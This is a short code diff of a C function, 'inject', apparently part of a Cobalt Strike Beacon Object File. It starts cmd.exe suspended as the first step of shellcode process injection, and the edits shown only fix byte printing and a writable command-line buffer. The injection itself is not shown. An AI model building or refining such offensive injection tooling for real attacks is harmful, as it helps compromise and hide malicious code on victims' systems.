@@ -6,7 +6,8 @@
 
 void inject(const CHAR* shellcode, SIZE_T shellcodeSize) {
     BeaconPrintf(CALLBACK_OUTPUT, "shellcode[0..3]: %02x %02x %02x %02x\n",
-        shellcode[0], shellcode[1], shellcode[2], shellcode[3]);
+        (unsigned char)shellcode[0], (unsigned char)shellcode[1],
+        (unsigned char)shellcode[2], (unsigned char)shellcode[3]);
 
     STARTUPINFOW si = { 0 };
     si.cb = sizeof(si);
@@ -14,7 +15,8 @@ void inject(const CHAR* shellcode, SIZE_T shellcodeSize) {
 
     PROCESS_INFORMATION pi = { 0 };
 
-    BOOL createProcessRes = KERNEL32$CreateProcessW(NULL, L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, L"C:\\Windows\\System32", &si, &pi);
+    wchar_t cmdLine[] = L"C:\\Windows\\System32\\cmd.exe";
+    BOOL createProcessRes = KERNEL32$CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, L"C:\\Windows\\System32", &si, &pi);
     if (createProcessRes == 0) {
         DWORD err = KERNEL32$GetLastError();
         BeaconPrintf(CALLBACK_OUTPUT, "failed to create process: %lu\n", err);
